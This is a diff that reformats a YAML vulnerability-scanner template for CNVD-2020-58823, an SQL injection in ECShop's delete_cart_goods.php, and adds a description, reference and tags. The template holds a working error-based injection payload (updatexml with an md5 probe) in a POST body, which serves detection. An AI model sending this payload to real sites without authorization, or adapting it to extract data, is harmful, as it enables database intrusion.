@@ -1,19 +1,24 @@
 id: CNVD-2020-58823
 
 info:
-    name: ecshop-CNVD-2020-58823-sqli
-    author: 凉风(http://webkiller.cn/)
-    severity: high
-    verified: true
+  name: ecshop-delete-cart-goods-sqli
+  author: 凉风(http://webkiller.cn/)
+  severity: high
+  verified: true
+  description: |
+    ecshop存在SQL注入漏洞，攻击者可以通过构造恶意请求获取数据库信息。
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-58823
+  tags: cnvd,cnvd2020,ecshop,sqli
+  created: 2020/12/15
 
 set:
-    r1: randomInt(40000, 44800)
+  r1: randomInt(40000, 44800)
 rules:
-    r0:
-        request:
-            method: POST
-            path: /delete_cart_goods.php
-            body: id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))
-        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+  r0:
+    request:
+      method: POST
+      path: /delete_cart_goods.php
+      body: id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))
+    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
 expression: r0()
-
